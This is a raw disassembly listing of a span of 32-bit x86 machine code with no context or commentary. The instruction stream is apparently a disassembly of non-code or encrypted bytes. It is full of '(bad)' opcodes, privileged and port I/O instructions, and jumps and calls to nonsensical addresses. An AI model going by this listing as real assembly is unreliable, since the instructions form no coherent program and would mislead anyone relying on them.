  41d669:	or     esi,DWORD PTR [ebp-0x7f]
  41d66c:	in     al,dx
  41d66d:	inc    eax
  41d66e:	das    
  41d66f:	dec    ebx
  41d670:	sbb    ah,BYTE PTR [ecx-0x1b]
  41d673:	jg     0x41d6e6
  41d675:	stos   DWORD PTR es:[edi],eax
  41d676:	cmc    
  41d677:	adc    BYTE PTR [eax],bh
  41d679:	and    bh,bh
  41d67b:	mov    esi,0xb4aeb5da
  41d680:	jp     0x41d651
  41d682:	mov    eax,0xd7a2c6d2
  41d687:	mov    WORD PTR [edx+0x43],ss
  41d68a:	ins    DWORD PTR es:[edi],dx
  41d68b:	mov    eax,ds:0xe387383
  41d690:	aad    0x54
  41d692:	out    dx,al
  41d693:	inc    esi
  41d694:	pop    ecx
  41d695:	call   FWORD PTR [esi+0x4f]
  41d698:	cmp    ebx,DWORD PTR [ecx+0x461da1da]
  41d69e:	mov    edx,0xdf265ab
  41d6a3:	imul   esp,ebx,0xd597ee5c
  41d6a9:	and    al,0xd8
  41d6ab:	lahf   
  41d6ac:	jmp    0x6e289bb
  41d6b1:	mov    dl,0x21
  41d6b3:	xchg   ecx,eax
  41d6b4:	sti    
  41d6b5:	xchg   ebp,eax
  41d6b6:	xor    eax,0x2a095961
  41d6bb:	or     cl,BYTE PTR [edi-0x276ad179]
  41d6c1:	push   edi
  41d6c2:	out    dx,eax
  41d6c3:	mov    al,ds:0x974d7bb7
  41d6c8:	ds das 
  41d6ca:	xchg   ecx,eax
  41d6cb:	cs pop ebp
  41d6cd:	lock xchg esp,eax
  41d6cf:	stos   BYTE PTR es:[edi],al
  41d6d0:	pop    edi
  41d6d1:	jae    0x41d70a
  41d6d3:	or     bl,BYTE PTR [esi]
  41d6d5:	mov    cl,0x32
  41d6d7:	push   eax
  41d6d8:	or     al,0xb3
  41d6da:	sbb    BYTE PTR [eax-0x1bfc9020],ch
  41d6e0:	xchg   DWORD PTR [ecx-0x5c313e76],ebp
  41d6e6:	fidiv  DWORD PTR [ebp-0x59c4c0a5]
  41d6ec:	sbb    edx,ebp
  41d6ee:	pop    esi
  41d6ef:	lea    ebx,[ecx-0x71d6b3b2]
  41d6f5:	pop    ecx
  41d6f6:	in     al,dx
  41d6f7:	inc    ebp
  41d6f8:	cs int 0x19
  41d6fb:	loope  0x41d6d6
  41d6fd:	jnp    0x41d6f3
  41d6ff:	sbb    DWORD PTR [ebx+0x37],0xffffff8e
  41d703:	sub    BYTE PTR [esp+edx*2+0x7e],cl
  41d707:	mov    al,0x72
  41d709:	mov    edx,0x707ba10a
  41d70e:	std    
  41d70f:	in     al,0x6e
  41d711:	or     bl,BYTE PTR [eax]
  41d713:	cld    
  41d714:	arpl   WORD PTR [edx+eiz*1-0x5],bx
  41d718:	or     bl,BYTE PTR [edx]
  41d71a:	imul   eax,DWORD PTR [edx+0x7e],0x9fe71309
  41d721:	mov    esi,0x3524a0c8
  41d726:	mov    ch,0x27
  41d728:	jl     0x41d792
  41d72a:	call   0x3f93:0xf68e5e1d
  41d731:	popf   
  41d732:	cmp    eax,0x495da50b
  41d737:	xchg   ecx,eax
  41d738:	inc    ecx
  41d739:	cmp    al,0x18
  41d73b:	test   DWORD PTR cs:[ecx+esi*4],ebp
  41d73f:	push   eax
  41d740:	xchg   edx,eax
  41d741:	(bad)  
  41d742:	out    dx,al
  41d743:	faddp  st(5),st
  41d745:	xchg   ebp,eax
  41d746:	outs   dx,DWORD PTR ds:[esi]
  41d747:	ja     0x41d788
  41d749:	xor    al,0xcc
  41d74b:	mov    al,ds:0x35caf50f
  41d750:	idiv   BYTE PTR [ecx+0x56]
  41d753:	loop   0x41d7b4
  41d755:	push   es
  41d756:	mov    eax,ds:0x6b77e057
  41d75b:	cmp    eax,ebx
  41d75d:	(bad)  
  41d75e:	lds    ebx,FWORD PTR [edi+0x311d434b]
  41d764:	fisub  WORD PTR [eax-0x8c7db]
  41d76a:	jle    0x41d7c4
  41d76c:	pop    ebx
  41d76d:	out    0x62,al
  41d76f:	cmp    DWORD PTR [esi-0x4d],0xffffffde
  41d773:	(bad)  
  41d774:	in     eax,0xf1
  41d776:	in     al,0xa0
  41d778:	jo     0x41d773
  41d77a:	pop    eax
  41d77b:	test   eax,0xd28a6460
  41d780:	pop    esi
  41d781:	xor    DWORD PTR [edi],0xffffff81
  41d784:	imul   ebp,DWORD PTR [edi+0x5de34afb],0x39
  41d78b:	push   cs
  41d78c:	nop
  41d78d:	imul   esp,eax,0xfffffff5
  41d790:	jbe    0x41d754
  41d792:	div    eax
  41d794:	pop    esi
  41d795:	xchg   BYTE PTR [eax+0x11],al
  41d798:	jne    0x41d72d
  41d79a:	shr    BYTE PTR [ebx+0x7f1c6155],cl
  41d7a0:	stc    
  41d7a1:	out    dx,al
  41d7a2:	pop    ecx
  41d7a3:	and    DWORD PTR [eax],eax
  41d7a5:	mov    ecx,0x709c5802
  41d7aa:	scas   al,BYTE PTR es:[edi]
  41d7ab:	xor    DWORD PTR [esi],edx
  41d7ad:	xchg   ecx,ebp
  41d7af:	inc    ecx
  41d7b0:	in     eax,0xb8
  41d7b2:	mov    cl,0x8e
  41d7b4:	test   al,0x81
  41d7b6:	sbb    cl,ah
  41d7b8:	outs   dx,BYTE PTR ds:[esi]
  41d7b9:	jne    0x41d780
  41d7bb:	xor    BYTE PTR [edx-0x73],bl
  41d7be:	out    dx,eax
  41d7bf:	cld    
  41d7c0:	nop
  41d7c1:	pop    DWORD PTR [edi]
  41d7c3:	test   BYTE PTR [edx+0x2e412921],ch
  41d7c9:	cmp    al,0x2f
  41d7cb:	mov    eax,ds:0xe901f949
  41d7d0:	push   ss
  41d7d1:	mov    BYTE PTR [ebp+0x64],bl
  41d7d4:	scas   al,BYTE PTR es:[edi]
  41d7d5:	jmp    edi
  41d7d7:	push   esi
  41d7d8:	push   esi
  41d7d9:	sti    
  41d7da:	pop    eax
  41d7db:	dec    edi
  41d7dc:	outs   dx,BYTE PTR ds:[esi]
  41d7dd:	test   al,0x74
  41d7df:	outs   dx,DWORD PTR ds:[esi]
  41d7e0:	sub    DWORD PTR [ecx+0x24],esp
  41d7e3:	test   DWORD PTR [esi-0x68c66e1f],ebp
  41d7e9:	mov    ch,dh
  41d7eb:	push   edx
  41d7ec:	adc    eax,0xb7bede41
  41d7f1:	(bad)  
  41d7f2:	sub    ah,BYTE PTR [ecx+0x582d7593]
  41d7f8:	push   0x445fc7f5
  41d7fd:	cs fcomp st(4)
  41d800:	pop    esi
  41d801:	jnp    0x41d7e9
  41d803:	hlt    
  41d804:	mov    esi,0x3da0c08a
  41d809:	ins    DWORD PTR es:[edi],dx
  41d80a:	ror    DWORD PTR [edi+ecx*2+0x14],0x5d
  41d80f:	enter  0xbc5e,0xc7
  41d813:	pop    eax
  41d814:	stos   BYTE PTR es:[edi],al
  41d815:	imul   DWORD PTR [eax+0x55f6bde]
  41d81b:	add    BYTE PTR [bx+di-0x87e],al
  41d820:	pop    es
  41d821:	inc    ecx
  41d822:	imul   DWORD PTR [ebp+0x5e]
  41d825:	arpl   ax,bp
  41d827:	mov    BYTE PTR [ebx],dh
  41d829:	pop    edx
  41d82a:	out    dx,eax
  41d82b:	or     eax,0x229f52fb
  41d830:	hlt    
  41d831:	arpl   WORD PTR [esi-0x20cd75fe],cx
  41d837:	ret    0xc15e
  41d83a:	mov    BYTE PTR [ecx],bl
  41d83c:	sbb    DWORD PTR [ecx+0x66208727],edi
  41d842:	sbb    BYTE PTR [edi],0xde
  41d845:	cmc    
  41d846:	mov    eax,ds:0x7d93bfb8
  41d84b:	cmp    DWORD PTR [esi+0x25],ebx
  41d84e:	invd   
  41d850:	inc    edi
  41d851:	lods   al,BYTE PTR ds:[esi]
  41d852:	jmp    0x41d866
  41d854:	or     eax,0x8a24065c
  41d859:	or     DWORD PTR [edx-0x61],edi
  41d85c:	xchg   DWORD PTR [eax],esp
  41d85e:	into   
  41d85f:	outs   dx,BYTE PTR ds:[esi]
  41d860:	mov    ds:0x5e0b9c63,al
  41d865:	inc    edi
  41d866:	scas   eax,DWORD PTR es:[edi]
  41d867:	iret   
  41d868:	cld    
  41d869:	add    al,0x9a
  41d86b:	call   0x43a13946
  41d870:	int    0xd2
  41d872:	fisttp QWORD PTR [ecx+0xa]
  41d875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d876:	out    dx,al
  41d877:	jmp    0x1fec1722
  41d87c:	data16 outs dx,BYTE PTR ds:[esi]
  41d87e:	sub    eax,0x155a3cf4
  41d883:	(bad)  
  41d884:	and    ecx,ecx
  41d886:	sti    
  41d887:	adc    BYTE PTR [edx+ebx*1-0x40],ch
  41d88b:	pop    ss
  41d88c:	pop    esi
  41d88d:	test   al,0xa0
  41d88f:	sub    ebx,esi
  41d891:	mov    DWORD PTR [edx],ebp
  41d893:	aaa    
  41d894:	data16 mov bl,0xb3
  41d897:	mov    ?,eax
  41d899:	fisttp QWORD PTR [ecx+eiz*2+0x13]
  41d89d:	sub    edx,DWORD PTR [edx+0x85d85a9]
  41d8a3:	daa    
  41d8a4:	xchg   ebp,eax
  41d8a5:	and    ebp,esi
  41d8a7:	pop    eax
  41d8a8:	add    al,BYTE PTR [edx+0x5de4de71]
  41d8ae:	or     dl,ch
  41d8b0:	xchg   ecx,eax
  41d8b1:	sub    dh,BYTE PTR [edx-0x50]
  41d8b4:	xchg   esi,eax
  41d8b5:	xchg   ecx,eax
  41d8b6:	sub    al,0x6c
  41d8b8:	pop    esi
  41d8b9:	or     esp,DWORD PTR [esi]
  41d8bb:	lea    ebx,[esp+edi*2+0x615b90e2]
  41d8c2:	sub    eax,0x16b2976d
  41d8c7:	(bad)  
  41d8c8:	mov    ebx,0x8b80ee01
  41d8cd:	lock test al,0xfc
  41d8d0:	into   
  41d8d1:	push   edx
  41d8d2:	or     esp,DWORD PTR [ecx+0x194c7f79]
  41d8d8:	lods   al,BYTE PTR ds:[esi]
  41d8d9:	pop    esi
  41d8da:	mov    ecx,0x69fe5ef8
  41d8df:	ins    BYTE PTR es:[edi],dx
  41d8e0:	adc    DWORD PTR [ecx-0x5a528892],esi
  41d8e6:	outs   dx,BYTE PTR ds:[esi]
  41d8e7:	and    DWORD PTR [ebp+0x7c9e1379],0x3a53ee83
  41d8f1:	mov    ds:0xb674e9dd,al
  41d8f6:	(bad)  
  41d8f7:	mov    al,ds:0xda72a709
  41d8fc:	mov    ds:0x5ea6d3b5,eax
  41d901:	mov    esi,0x6c832dfd
  41d906:	lods   al,BYTE PTR ds:[esi]
  41d907:	fisubr DWORD PTR [ecx+0x52]
  41d90a:	push   ds
  41d90b:	add    BYTE PTR [esp+edx*8],al
  41d90e:	cs js  0x41d98e
  41d911:	ret    0xfb7c
  41d914:	pop    ebp
  41d915:	cli    
  41d916:	int3   
  41d917:	xchg   ecx,eax
  41d918:	xchg   esi,eax
  41d919:	xor    edi,DWORD PTR [ebx+0x630c9295]
  41d91f:	mov    eax,ds:0xb33089b0
  41d924:	jmp    0x41d95c
  41d926:	ficomp DWORD PTR [ecx-0x33a789b6]
  41d92c:	jno    0x41d98e
  41d92e:	ds aam 0x99
  41d931:	ds adc edx,0xffffff84
  41d935:	pop    ebx
  41d936:	sbb    eax,0xb314a390
  41d93b:	and    BYTE PTR [edx+0x1d],bl
  41d93e:	jbe    0x41d919
  41d940:	cmp    al,0xc1
  41d942:	or     bl,bh
  41d944:	pop    esi
  41d945:	pop    ds
  41d946:	fstp   TBYTE PTR [ecx-0x3c]
  41d949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d94a:	mov    ebx,0x249119a0
  41d94f:	sbb    eax,0xa5965821
  41d954:	pop    edi
  41d955:	loop   0x41d984
  41d957:	push   edi
  41d958:	adc    DWORD PTR ds:0xfb2e886d,edi
  41d95e:	push   es
  41d95f:	imul   edx,esp,0x60
  41d962:	mov    ecx,0xec27984e
  41d967:	test   BYTE PTR [edx+0x77],0xee
  41d96b:	shl    DWORD PTR [ebx],1
  41d96d:	ret    0x224f
  41d970:	xchg   ebp,eax
  41d971:	in     eax,0xc6
  41d973:	push   0x37
  41d975:	push   edx
  41d976:	xchg   BYTE PTR [edi-0x55],bh
  41d979:	hlt    
  41d97a:	mov    al,0xdb
  41d97c:	mov    esi,0xeb09c711
  41d981:	stos   BYTE PTR es:[edi],al
  41d982:	in     eax,dx
  41d983:	cmp    BYTE PTR [ebp-0x80],dh
  41d986:	xor    ecx,esi
  41d988:	cmp    ebx,esi
  41d98a:	dec    edx
  41d98b:	call   0x7c3b3ae8
  41d990:	sbb    cl,al
  41d992:	iret   
  41d993:	test   BYTE PTR [edi],bh
  41d995:	xchg   ebx,eax
  41d996:	out    dx,al
  41d997:	push   eax
  41d998:	pop    ss
  41d999:	dec    eax
  41d99a:	xor    dh,BYTE PTR ds:0x8e239c12
  41d9a0:	fstp   TBYTE PTR [bp-0x1f]
  41d9a4:	cmp    BYTE PTR [ebx-0x3f],al
  41d9a7:	dec    DWORD PTR [edx+0x280eee36]
  41d9ad:	fst    DWORD PTR [edi-0x4da7805c]
  41d9b3:	mov    al,ds:0x7d563456
  41d9b8:	dec    esi
  41d9b9:	iret   
  41d9ba:	cmp    BYTE PTR ds:0xcf1e095e,bl
  41d9c0:	fiadd  DWORD PTR [ecx+0x6043c9b1]
  41d9c6:	jae    0x41d9e6
  41d9c8:	sub    ecx,DWORD PTR [esi+0x27]
  41d9cb:	inc    eax
  41d9cc:	xor    dl,BYTE PTR [ecx-0x3fa1bb27]
  41d9d2:	stos   DWORD PTR es:[edi],eax
  41d9d3:	dec    edx
  41d9d4:	idiv   DWORD PTR [esi+0x60bd83e2]
  41d9da:	add    BYTE PTR [edx-0xa],cl
  41d9dd:	mov    ds:0x2eb999f,eax
  41d9e2:	out    dx,al
  41d9e3:	sub    DWORD PTR [esi-0x59],ebp
  41d9e6:	hlt    
  41d9e7:	mov    ebx,DWORD PTR ds:0xa0a13236
  41d9ed:	xor    DWORD PTR [esp+eiz*8+0x688b5467],eax
  41d9f4:	sahf   
  41d9f5:	cmp    al,0x31
  41d9f7:	xor    ecx,DWORD PTR [ecx-0x52]
  41d9fa:	test   DWORD PTR [ecx-0x603600dc],esp
  41da00:	or     BYTE PTR [ecx+0x1867ed75],ah
  41da06:	xchg   edx,eax
  41da08:	mov    edx,edx
  41da0a:	pop    es
  41da0b:	loope  0x41da1f
  41da0d:	aas    
  41da0e:	fbld   TBYTE PTR [esi]
  41da10:	cld    
  41da11:	pusha  
  41da12:	jbe    0x41da3a
  41da14:	ss jl  0x41da6d
  41da17:	test   dh,dh
  41da19:	nop
  41da1a:	ficomp DWORD PTR [eax+0x5e]
  41da1d:	add    eax,DWORD PTR [eax+0x7978150c]
  41da23:	jle    0x41da08
  41da25:	add    al,0x5b
  41da27:	ins    BYTE PTR es:[edi],dx
  41da28:	pop    edi
  41da29:	push   eax
  41da2a:	push   ss
  41da2b:	mov    eax,0xf9a67dec
  41da30:	shrd   esi,ebx,cl
  41da33:	inc    ebx
  41da34:	pop    esi
  41da35:	fnsave [edx-0x7bcc854e]
  41da3b:	sub    eax,0xd8fc615d
  41da40:	das    
  41da41:	mov    ?,WORD PTR [esi-0x34]
  41da44:	jmp    0xbd4dfd02
  41da49:	loopne 0x41dab2
  41da4b:	add    ebp,DWORD PTR [esp+ebp*8+0x6096a2ff]
  41da52:	or     ch,BYTE PTR [edx+eax*4+0x27677b26]
  41da59:	xor    al,0x25
  41da5b:	dec    esp
  41da5c:	repz pusha 
  41da5e:	ins    DWORD PTR es:[edi],dx
  41da5f:	dec    ebp
  41da60:	xor    BYTE PTR [edi+esi*4],dl
  41da63:	cmp    DWORD PTR [ebx],esp
  41da65:	popa   
  41da66:	sahf   
  41da67:	inc    ecx
  41da68:	sub    eax,DWORD PTR [ecx-0x22324b03]
  41da6e:	out    dx,al
  41da6f:	or     esi,edi
  41da71:	mov    ecx,DWORD PTR [eax+0x352e1679]
  41da77:	lock mov dl,0x60
  41da7a:	xlat   BYTE PTR ds:[ebx]
  41da7b:	je     0x41daf9
  41da7d:	pop    ss
  41da7e:	jp     0x41da41
  41da80:	dec    esp
  41da81:	ret    0xdfee
  41da84:	pop    ss
  41da85:	or     BYTE PTR [ecx+0x23],dh
  41da88:	div    eax
  41da8a:	xor    esi,DWORD PTR [ebp-0x21]
  41da8d:	pusha  
  41da8e:	cmp    ah,dh
  41da90:	mov    ecx,0x879d2028
  41da95:	cwde   
  41da96:	jmp    0x41da4b
  41da98:	repnz enter 0x3f83,0x9e
  41da9d:	xchg   bh,ah
  41da9f:	pusha  
  41daa0:	ror    BYTE PTR [ebp+0x6fed8ea5],1
  41daa6:	mov    eax,ds:0xf28ff1e1
  41daab:	xor    al,0x2c
  41daad:	cwde   
  41daae:	out    dx,al
  41daaf:	mov    esp,0x374b1b10
  41dab4:	mov    ah,0x79
  41dab6:	(bad)  
  41dab7:	sahf   
  41dab8:	sub    DWORD PTR [eax+ebp*1-0x17],eax
  41dabc:	jle    0x41da40
  41dabe:	jecxz  0x41da46
  41dac0:	ds (bad) 
  41dac2:	out    dx,al
  41dac3:	xor    bl,BYTE PTR [ebx+0x4db81af5]
  41dac9:	aam    0x3
  41dacb:	mov    eax,ds:0x5781af23
  41dad0:	mov    esi,0xf4108df7
  41dad5:	pop    esp
  41dad6:	pop    ds
  41dad7:	push   es
  41dad8:	xchg   cl,ah
  41dada:	in     al,0xf3
  41dadc:	ss out 0x3b,eax
  41dadf:	or     eax,0x47ae254b
  41dae4:	mov    fs,esp
  41dae6:	sbb    DWORD PTR [eax],ebx
  41dae8:	xor    eax,0x66bca356
  41daed:	int3   
  41daee:	outs   dx,BYTE PTR ds:[esi]
  41daef:	out    dx,eax
  41daf0:	shr    dh,cl
  41daf2:	(bad)  
  41daf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daf4:	pop    esi
  41daf5:	push   ebp
  41daf6:	shl    BYTE PTR [edx-0x6e],1
  41daf9:	mov    ds:0x6111af43,eax
  41dafe:	pop    ebx
  41daff:	sbb    cl,cl
  41db01:	mov    DWORD PTR [eax],0x4a20753e
  41db07:	mov    al,0x36
  41db09:	dec    edx
  41db0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db0b:	fstp   TBYTE PTR [esi-0x43]
  41db0e:	inc    edx
  41db0f:	mov    eax,ds:0xd23babe4
  41db14:	int3   
  41db15:	in     eax,dx
  41db16:	xchg   edi,eax
  41db17:	cmp    DWORD PTR [esi+0x1],ebx
  41db1a:	ret    
  41db1b:	das    
  41db1c:	out    0x26,al
  41db1e:	test   BYTE PTR [edx],al
  41db20:	push   ds
  41db21:	pusha  
  41db22:	jns    0x41db25
  41db24:	outs   dx,DWORD PTR ds:[esi]
  41db25:	cmp    DWORD PTR [edx],edi
  41db27:	dec    esi
  41db28:	add    al,0x31
  41db2a:	dec    eax
  41db2b:	das    
  41db2c:	pop    esi
  41db2d:	add    BYTE PTR [ebx+0x3f],0xd0
  41db31:	cli    
  41db32:	push   esp
  41db33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db34:	adc    al,0x61
  41db36:	sbb    eax,0x3f9643e8
  41db3b:	test   al,0xc2
  41db3d:	xor    esi,ebp
  41db3f:	leave  
  41db40:	daa    
  41db41:	mov    eax,0xfc6cf444
  41db46:	test   al,0xa0
  41db48:	lods   eax,DWORD PTR ds:[esi]
  41db49:	jbe    0x41db94
  41db4b:	pop    esp
  41db4c:	std    
  41db4d:	dec    esi
  41db4e:	mov    ecx,0x45205ed9
  41db53:	mov    ch,BYTE PTR [edx+edi*2-0x5a96d719]
  41db5a:	ss ds inc ebx
  41db5d:	pop    esi
  41db5e:	adc    al,BYTE PTR [ebx]
  41db60:	mov    ecx,0x8e99b95c
  41db65:	lock lea eax,[ecx+0x40ee6d82]
  41db6c:	stos   BYTE PTR es:[edi],al
  41db6d:	cld    
  41db6e:	outs   dx,DWORD PTR ds:[esi]
  41db6f:	xchg   edi,eax
  41db70:	inc    ebx
  41db71:	jo     0x41dbd8
  41db73:	in     al,dx
  41db74:	leave  
  41db75:	pusha  
  41db76:	lods   al,BYTE PTR ds:[esi]
  41db77:	les    ebx,FWORD PTR [eax+0x4f]
  41db7a:	sbb    BYTE PTR [ebx+0x60eeb7b5],0x28
  41db81:	jmp    0x41dbf6
  41db83:	sub    DWORD PTR [esi+0x6aee40f0],eax
  41db89:	pusha  
  41db8a:	ret    0x40b
  41db8d:	loopne 0x41db17
  41db8f:	out    dx,eax
  41db90:	fs add al,0xda
  41db93:	mov    edx,0x51681c5e
  41db98:	add    esi,esp
  41db9a:	add    ebx,DWORD PTR [ebx-0x5eea595a]
  41dba0:	xchg   esi,eax
  41dba1:	mov    ebp,0x8335f855
  41dba6:	(bad)  
  41dba7:	fistp  DWORD PTR [esi+0x2b]
  41dbaa:	dec    eax
  41dbab:	adc    bh,BYTE PTR ds:0xeecc2279
  41dbb1:	pop    ebp
  41dbb2:	pop    ebp
  41dbb3:	cmp    bl,BYTE PTR [edx]
  41dbb5:	pop    ebp
  41dbb6:	cmp    DWORD PTR [ebp+0x76],ecx
  41dbb9:	fisubr DWORD PTR [ecx-0x790fa12a]
  41dbbf:	dec    ebx
  41dbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbc1:	jle    0x41dba6
  41dbc3:	jb     0x41db73
  41dbc5:	lahf   
  41dbc6:	adc    al,0xbc
  41dbc8:	in     eax,0x71
  41dbca:	rcl    BYTE PTR [eax-0x40],1
  41dbcd:	(bad)  
  41dbce:	xchg   BYTE PTR [esi*1+0x57a0f3b2],bh
  41dbd5:	shl    DWORD PTR [esi-0x2c],cl
  41dbd8:	cmp    al,0x31
  41dbda:	js     0x41db7d
  41dbdc:	xchg   BYTE PTR [ecx],al
  41dbde:	mov    dl,0x10
  41dbe0:	ss leave 
  41dbe2:	jne    0x41dc51
  41dbe4:	pop    esi
  41dbe5:	clc    
  41dbe6:	push   es
  41dbe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbe8:	jns    0x41db7d
  41dbea:	and    DWORD PTR [ecx+0x67],0x66
  41dbee:	(bad)  
  41dbef:	ja     0x41dba6
  41dbf1:	ja     0x41dc61
  41dbf3:	lahf   
  41dbf4:	or     DWORD PTR [ecx],edx
  41dbf6:	cmp    ch,BYTE PTR ds:0x38eb7f9a
  41dbfc:	pop    eax
  41dbfd:	outs   dx,DWORD PTR ds:[esi]
  41dbfe:	fmul   DWORD PTR [ebx+0x77]
  41dc01:	add    cl,dl
  41dc03:	adc    eax,0xa0dee900
  41dc08:	es inc eax
  41dc0a:	xor    al,0xbe
  41dc0c:	jne    0x41dc25
  41dc0e:	push   0x4d
  41dc10:	cmp    al,0xb0
  41dc12:	inc    ecx
  41dc13:	cli    
  41dc14:	pop    esi
  41dc15:	es jl  0x41dc64
  41dc18:	add    BYTE PTR [edi+0x5a],bh
  41dc1b:	popa   
  41dc1c:	outs   dx,BYTE PTR ds:[esi]
  41dc1d:	jno    0x41dc18
  41dc1f:	jne    0x41dc96
  41dc21:	inc    edx
  41dc22:	jmp    0x41dc4a
  41dc24:	and    DWORD PTR [edi],ebx
  41dc26:	in     al,dx
  41dc27:	ins    DWORD PTR es:[edi],dx
  41dc28:	and    eax,0xe1284c91
  41dc2d:	pusha  
  41dc2e:	xchg   esi,eax
  41dc2f:	cs cmp ch,ch
  41dc32:	(bad)  
  41dc33:	(bad)  
  41dc34:	pop    eax
  41dc35:	fucomip st,st(7)
  41dc37:	pop    edx
  41dc38:	ins    BYTE PTR es:[edi],dx
  41dc39:	shr    cl,1
  41dc3b:	add    bh,bl
  41dc3d:	fadd   QWORD PTR [edx-0x1cbc618f]
  41dc43:	push   ss
  41dc44:	hlt    
  41dc45:	addr16 out dx,al
  41dc47:	mov    ch,0x86
  41dc49:	rol    BYTE PTR [edx],cl
  41dc4b:	jecxz  0x41dc4f
  41dc4d:	imul   esi
  41dc4f:	sbb    BYTE PTR [ebx],bl
  41dc51:	mov    bh,0x5b
  41dc53:	mov    ebx,0xa7c76fde
  41dc58:	add    al,0x5c
  41dc5a:	data16 cld 
  41dc5c:	push   ebx
  41dc5d:	xchg   ecx,eax
  41dc5e:	xor    DWORD PTR [ebp-0x58],esp
  41dc61:	push   cs
  41dc62:	out    dx,al
  41dc63:	mov    al,BYTE PTR ds:0x19ad9966
  41dc69:	mov    al,BYTE PTR [edi-0xd0d4a5f]
  41dc6f:	loopne 0x41dce8
  41dc71:	jmp    0x86b:0xc5e90f5
  41dc78:	pusha  
  41dc79:	fild   DWORD PTR [eax+0x71]
  41dc7c:	and    DWORD PTR [eax+0x14],0x2
  41dc80:	retf   
  41dc81:	add    esp,DWORD PTR [ecx-0x33]
  41dc84:	fs mul edi
  41dc87:	mov    DWORD PTR [esi-0x13],edi
  41dc8a:	ins    DWORD PTR es:[edi],dx
  41dc8b:	push   ecx
  41dc8c:	ds pop ebp
  41dc8e:	aad    0x5b
  41dc90:	mov    bl,0x60
  41dc92:	and    eax,0xe36f72f3
  41dc97:	into   
  41dc98:	pop    esp
  41dc99:	nop
  41dc9a:	jmp    0x41dcb3
  41dc9c:	jecxz  0x41dc6b
  41dc9e:	adc    eax,0xedf0eb81
  41dca3:	jecxz  0x41dcc8
  41dca5:	popa   
  41dca6:	mov    DWORD PTR [eax-0x59],esi
  41dca9:	das    
  41dcaa:	mov    al,0x3
  41dcad:	ja     0x41dcb1
  41dcaf:	or     ecx,DWORD PTR [ecx+ebp*4]
  41dcb2:	and    eax,0xfedf7721
  41dcb7:	mov    eax,0xa150e18d
  41dcbc:	mov    ecx,0x28a1c62c
  41dcc1:	sti    
  41dcc2:	xlat   BYTE PTR ds:[ebx]
  41dcc3:	cdq    
  41dcc4:	out    dx,al
  41dcc5:	sub    ch,ch
  41dcc7:	ror    esp,cl
  41dcc9:	cld    
  41dcca:	sub    eax,0x2a338489
  41dccf:	inc    esp
  41dcd0:	mov    bh,0x60
  41dcd2:	jns    0x41dcce
  41dcd4:	loopne 0x41dc91
  41dcd6:	ds inc edx
  41dcd8:	pop    edx
  41dcd9:	gs out dx,al
  41dcdb:	shl    BYTE PTR cs:[edx+0x4a3dc3c8],0x14
  41dce3:	mov    eax,ds:0xe7a6b823
  41dce8:	call   0x5e954d7c
  41dced:	mul    BYTE PTR [ebx-0x2c103adc]
  41dcf3:	test   BYTE PTR [edi-0x4c4a4da0],al
  41dcf9:	gs pop edi
  41dcfb:	inc    ebp
  41dcfc:	cdq    
  41dcfd:	mov    ebp,fs
  41dcff:	cmp    bl,BYTE PTR [esi+0x27]
  41dd02:	outs   dx,BYTE PTR gs:[esi]
  41dd04:	push   ds
  41dd05:	popf   
  41dd06:	cmc    
  41dd07:	jns    0x41dd2d
  41dd09:	pusha  
  41dd0a:	(bad)  
  41dd0b:	ficom  WORD PTR [edi-0x75]
  41dd0e:	mov    ecx,0xa9a862ff
  41dd13:	ins    BYTE PTR es:[edi],dx
  41dd14:	rol    DWORD PTR [edi-0x23],cl
  41dd17:	mov    bh,0x5e
  41dd19:	and    al,0xf0
  41dd1b:	add    eax,0x9b111196
  41dd20:	lahf   
  41dd21:	pusha  
  41dd22:	and    edi,DWORD PTR [esi]
  41dd24:	mov    esp,DWORD PTR [edx-0xb950cc2]
  41dd2a:	and    al,BYTE PTR [edx]
  41dd2c:	loope  0x41dd07
  41dd2e:	xlat   BYTE PTR ds:[ebx]
  41dd2f:	sub    BYTE PTR [ebx+0x24131eec],al
  41dd35:	inc    ebp
  41dd36:	push   ss
  41dd37:	mov    eax,ds:0xdb13f9e9
  41dd3c:	push   ebp
  41dd3d:	xor    ch,BYTE PTR [esi-0x13]
  41dd40:	pop    esi
  41dd41:	inc    esi
  41dd42:	xchg   ebx,eax
  41dd43:	adc    ch,al
  41dd45:	in     eax,0xfe
  41dd47:	cmp    al,0xf7
  41dd49:	pusha  
  41dd4a:	pop    ds
  41dd4b:	push   es
  41dd4c:	iret   
  41dd4d:	fs fcmovb st,st(3)
  41dd50:	sbb    ah,bl
  41dd52:	out    dx,al
  41dd53:	push   0xffffffa8
  41dd55:	push   esi
  41dd56:	sub    bh,BYTE PTR [eax-0x57]
  41dd59:	jns    0x41ddb3
  41dd5b:	test   al,0xa0
  41dd5d:	repz sub eax,0xad0e370
  41dd63:	and    ebp,DWORD PTR [edx-0x19]
  41dd66:	out    dx,al
  41dd67:	xor    al,0x28
  41dd69:	adc    al,0x80
  41dd6b:	cmp    bl,bl
  41dd6d:	xchg   ebx,eax
  41dd6e:	imul   ebp,DWORD PTR [edi-0x4e5c91f1],0xffffffcb
  41dd75:	mov    al,ds:0x8381a0b3
  41dd7a:	nop
  41dd7b:	jmp    0x41dd57
  41dd7d:	pop    ss
  41dd7e:	pop    edx
  41dd7f:	ja     0x41ddfd
  41dd81:	dec    eax
  41dd82:	add    BYTE PTR [esp+esi*2+0x4],bh
  41dd86:	out    dx,al
  41dd87:	cmp    bh,BYTE PTR [ecx]
  41dd89:	xlat   BYTE PTR ds:[ebx]
  41dd8a:	(bad)  
  41dd8b:	mov    eax,ds:0x105e67fd
  41dd90:	pop    esi
  41dd91:	jno    0x41dd6d
  41dd93:	iret   
  41dd94:	jg     0x41dde1
  41dd96:	jne    0x41dd84
  41dd98:	pop    esi
  41dd99:	adc    DWORD PTR [esi-0x20],esi
  41dd9c:	(bad)
  41dd9f:	icebp  
  41dda0:	mul    BYTE PTR [eax+0x46]
  41dda3:	xchg   ecx,eax
  41dda4:	push   esp
  41dda5:	mov    al,0xc4
  41dda7:	stc    
  41dda8:	retf   0xee2a
  41ddab:	scas   eax,DWORD PTR es:[edi]
  41ddac:	jg     0x41ddb1
  41ddae:	in     eax,0xd7
